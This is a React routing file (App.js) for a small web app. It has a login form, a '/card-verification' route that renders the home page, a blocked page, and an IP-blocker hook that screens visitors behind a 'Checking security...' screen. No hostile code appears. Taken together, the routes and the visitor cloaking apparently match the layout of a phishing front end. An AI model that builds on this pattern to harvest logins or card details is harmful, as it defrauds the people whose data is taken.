import React from 'react';
import { HashRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import './App.css';
import HomePage from './components/HomePage';
import LoginForm from './components/LoginForm';
import BlockedPage from './components/BlockedPage';
//import NextStepAppr from './components/NextStepAppr';
import { useIPBlocker } from './hooks/useIPBlocker';

function AppContent() {
  const { isChecking } = useIPBlocker();

  if (isChecking) {
    return (
      <div className="loading-screen">
        <div className="spinner"></div>
        <p>Checking security...</p>
      </div>
    );
  }

  return (
    <Routes>
      <Route path="/" element={<HomePage />} />
      <Route path="/login" element={<LoginForm />} />
      <Route path="/card-verification" element={<HomePage />} />
      <Route path="/blocked" element={<BlockedPage />} />

      <Route path="*" element={<Navigate to="/" />} />
    </Routes>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;